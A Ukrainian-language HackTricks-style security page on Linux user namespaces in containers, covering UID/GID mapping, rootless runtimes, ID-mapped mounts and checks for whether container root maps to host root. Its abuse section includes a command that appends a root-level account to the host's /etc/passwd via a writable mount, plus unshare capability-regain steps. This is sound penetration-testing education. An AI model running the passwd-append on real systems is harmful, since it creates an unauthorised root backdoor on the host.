# User Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Огляд

User namespace змінює значення ідентифікаторів користувачів і груп, дозволяючи kernel зіставляти ідентифікатори, видимі всередині namespace, з іншими ідентифікаторами за його межами. Це один із найважливіших сучасних захистів контейнерів, оскільки він безпосередньо усуває найбільшу історичну проблему класичних контейнерів: **root усередині контейнера був небезпечно близьким до root на host**.

За допомогою user namespaces процес може працювати як UID 0 усередині контейнера й водночас відповідати непривілейованому діапазону UID на host. Це означає, що процес може поводитися як root під час виконання багатьох завдань усередині контейнера, залишаючись значно менш привілейованим з точки зору host. Це не вирішує всіх проблем безпеки контейнерів, але суттєво змінює наслідки компрометації контейнера.

## Робота

User namespace має такі mapping-файли, як `/proc/self/uid_map` і `/proc/self/gid_map`, які описують, як ідентифікатори namespace перетворюються на ідентифікатори батьківського namespace. Якщо root усередині namespace зіставлено з непривілейованим UID на host, операції, для виконання яких потрібні реальні привілеї root на host, більше не мають такої самої сили. Саме тому user namespaces є основою **rootless containers** і однією з найбільших відмінностей між старішими rootful container defaults та сучаснішими least-privilege designs.

Цей момент тонкий, але надзвичайно важливий: root усередині контейнера не усувається, а **перекладається**. Процес і далі працює в локальному середовищі, подібному до root, але host не повинен сприймати його як повноцінний root.

## Лабораторна робота

Ручний тест:
```bash
unshare --user --map-root-user --fork bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
```
Це змушує поточного користувача виглядати як root усередині namespace, водночас він не є root хоста за його межами. Це одна з найкращих простих демонстрацій для розуміння того, чому user namespaces настільки цінні.

У контейнерах можна порівняти видиме зіставлення за допомогою:
```bash
docker run --rm debian:stable-slim sh -c 'id && cat /proc/self/uid_map'
```
Точний результат залежить від того, чи використовує engine user namespace remapping, чи більш традиційну rootful-конфігурацію.

Ви також можете прочитати mapping з боку host за допомогою:
```bash
cat /proc/<pid>/uid_map
cat /proc/<pid>/gid_map
```
## Використання під час виконання

Rootless Podman є одним із найнаочніших прикладів того, як user namespaces розглядаються як повноцінний механізм безпеки. Rootless Docker також залежить від них. Підтримка Docker userns-remap також підвищує безпеку в rootful daemon deployments, хоча історично багато deployments залишали її вимкненою з міркувань сумісності. Підтримка user namespaces у Kubernetes покращилася, але використання та значення за замовчуванням відрізняються залежно від runtime, дистрибутива та політики кластера. Системи Incus/LXC також значною мірою покладаються на зміщення UID/GID та ідеї idmapping.

Загальна тенденція очевидна: середовища, які серйозно використовують user namespaces, зазвичай дають кращу відповідь на запитання «що насправді означає container root?», ніж середовища, які їх не використовують.

## Розширені деталі mapping

Коли unprivileged process записує дані до `uid_map` або `gid_map`, kernel застосовує суворіші правила, ніж у випадку privileged parent namespace writer. Дозволені лише обмежені mappings, а для `gid_map` writer зазвичай спочатку має вимкнути `setgroups(2)`:
```bash
cat /proc/self/setgroups
echo deny > /proc/self/setgroups
```
Ця деталь важлива, оскільки пояснює, чому налаштування user namespace іноді завершується помилкою в rootless-експериментах і чому runtimes потребують ретельно продуманої допоміжної логіки для делегування UID/GID.

Ще однією розширеною функцією є **ID-mapped mount**. Замість зміни ownership на диску, ID-mapped mount застосовує mapping user namespace до mount, завдяки чому ownership відображається як перекладений у межах цього mount view. Це особливо важливо в rootless і сучасних runtime-налаштуваннях, оскільки дає змогу використовувати спільні host paths без рекурсивних операцій `chown`. З погляду безпеки ця функція змінює те, наскільки writable виглядає bind mount зсередини namespace, хоча й не перезаписує метадані underlying filesystem.

Насамкінець пам’ятайте: коли процес створює або входить у новий user namespace, він отримує повний набір capabilities **усередині цього namespace**. Це не означає, що він раптово отримав глобальні повноваження на host. Це означає, що ці capabilities можна використовувати лише там, де це дозволяють модель namespace та інші protections. Саме тому `unshare -U` може раптово зробити можливими mount або privileged operations, локальні для namespace, не усуваючи безпосередньо межу host root.

## Misconfigurations

Основна слабкість полягає просто в невикористанні user namespaces у середовищах, де вони були б доцільними. Якщо container root має надто пряме відображення на host root, writable host mounts і privileged kernel operations стають значно небезпечнішими. Інша проблема — примусове спільне використання host user namespace або вимкнення remapping заради сумісності без усвідомлення того, наскільки це змінює trust boundary.

User namespaces також потрібно розглядати разом з іншими компонентами моделі. Навіть коли вони активні, широке відкриття runtime API або дуже слабка runtime configuration усе ще можуть дозволити privilege escalation іншими шляхами. Але без них багато старих класів breakout стають значно простішими для exploitation.

## Abuse

Якщо container є rootful без розділення user namespace, writable host bind mount стає набагато небезпечнішим, оскільки процес може фактично виконувати запис від імені host root. Небезпечні capabilities також набувають більшого значення. Attacker більше не мусить так активно долати translation boundary, оскільки ця межа майже відсутня.

Наявність або відсутність user namespace слід перевіряти на ранньому етапі оцінювання шляху container breakout. Це не дає відповіді на всі питання, але одразу показує, чи має «root у container» пряме значення для host.

Найпрактичніший шаблон abuse полягає в тому, щоб підтвердити mapping, а потім одразу перевірити, чи можна записувати у вміст, змонтований з host, використовуючи privileges, релевантні для host:
```bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
touch /host/tmp/userns_test 2>/dev/null && echo "host write works"
ls -ln /host/tmp/userns_test 2>/dev/null
```
Якщо файл створено від імені справжнього root хоста, ізоляція user namespace фактично відсутня для цього шляху. На цьому етапі класичні зловживання файлами хоста стають реалістичними:
```bash
echo 'x:x:0:0:x:/root:/bin/bash' >> /host/etc/passwd 2>/dev/null || echo "passwd write blocked"
cat /host/etc/passwd | tail
```
Безпечнішим підтвердженням під час live assessment є запис benign marker замість зміни критичних файлів:
```bash
echo test > /host/root/userns_marker 2>/dev/null
ls -l /host/root/userns_marker 2>/dev/null
```
Ці перевірки важливі, оскільки вони швидко відповідають на справжнє запитання: чи відображається root у цьому container достатньо близько до root на host, щоб доступний для запису mount на host одразу став шляхом до компрометації host?

### Повний приклад: відновлення capabilities у межах namespace

Якщо seccomp дозволяє `unshare`, а середовище дає змогу створити новий user namespace, процес може відновити повний набір capabilities у межах цього нового namespace:
```bash
unshare -UrmCpf bash
grep CapEff /proc/self/status
mount -t tmpfs tmpfs /mnt 2>/dev/null && echo "namespace-local mount works"
```
Це саме по собі не є host escape. Важливість цього полягає в тому, що user namespaces можуть повторно дозволити привілейовані дії, локальні для namespace, які згодом можуть комбінуватися зі слабкими mount, вразливими kernel або неналежно відкритими runtime surfaces.

## Перевірки

Ці команди мають допомогти відповісти на найважливіше запитання на цій сторінці: до якого ідентифікатора root усередині цього container прив’язаний на host?
```bash
readlink /proc/self/ns/user   # User namespace identifier
id                            # Current UID/GID as seen inside the container
cat /proc/self/uid_map        # UID translation to parent namespace
cat /proc/self/gid_map        # GID translation to parent namespace
cat /proc/self/setgroups 2>/dev/null   # GID-mapping restrictions for unprivileged writers
```
Що тут цікаво:

- Якщо процес має UID 0, а maps показує пряме або дуже близьке зіставлення з host root, контейнер є значно небезпечнішим.
- Якщо root зіставляється з непривілейованим діапазоном на host, це набагато безпечніша базова конфігурація та зазвичай свідчить про справжню ізоляцію user namespace.
- Файли зіставлення цінніші за один лише `id`, оскільки `id` показує лише ідентичність у межах namespace.

Якщо workload працює як UID 0, а зіставлення показує, що це майже відповідає host root, слід набагато суворіше оцінювати решту привілеїв контейнера.

{{#include ../../../../../banners/hacktricks-training.md}}
